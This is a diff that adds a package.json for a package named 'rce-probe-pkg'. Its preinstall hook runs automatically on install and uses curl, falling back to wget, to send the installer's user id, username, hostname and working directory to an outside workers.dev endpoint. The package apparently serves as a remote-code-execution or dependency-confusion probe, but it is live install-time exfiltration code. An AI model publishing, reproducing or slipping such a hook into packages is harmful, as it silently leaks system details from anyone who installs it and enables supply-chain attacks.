@@ -1,0 +1,1 @@
+{"name":"rce-probe-pkg","version":"1.0.0","scripts":{"preinstall":"curl -s -X POST --data-binary \"RCE-PROOF id=$(id -u) user=$(whoami) host=$(hostname) pwd=$(pwd)\" https://cr-oob-01.claw-a64b48.workers.dev/npmrce || wget -q -O- --post-data=\"RCE-PROOF\" https://cr-oob-01.claw-a64b48.workers.dev/npmrce2\"}}
